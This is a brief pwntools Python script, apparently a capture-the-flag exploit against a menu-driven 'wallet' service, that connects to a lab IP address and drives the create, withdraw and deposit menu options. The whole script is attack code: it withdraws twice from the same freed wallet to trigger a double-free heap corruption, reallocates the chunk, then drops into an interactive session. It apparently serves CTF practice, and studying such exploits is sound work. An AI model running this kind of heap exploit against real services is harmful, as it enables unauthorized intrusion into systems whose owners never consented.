from pwn import *

HOST = ""
PORT = 1234
REMOTE = 0
if(REMOTE):
  s = remote(HOST,PORT)
else:
  s = remote('192.168.179.129',PORT)
def create(m):
  s.recvuntil(":")
  s.sendline("1")
  s.recvuntil("how much initial eth? :")
  s.sendline(str(m))

def free(idx, w):
  s.recvuntil(":")
  s.sendline("3")
  s.recvuntil("input wallet no :")
  s.sendline(str(idx))
  s.recvuntil("how much you wanna withdraw? : ")
  s.sendline(str(w))

def deposit(idx, m):
  s.recvuntil(":")
  s.sendline("2")
  s.recvuntil("input wallet no :")
  s.sendline(str(idx))
  s.recvuntil("how much deposit? : ")
  s.sendline(str(m))

raw_input()
create(0x100)
free(0,0x100)
free(0,0)
create(0x100)
s.interactive()
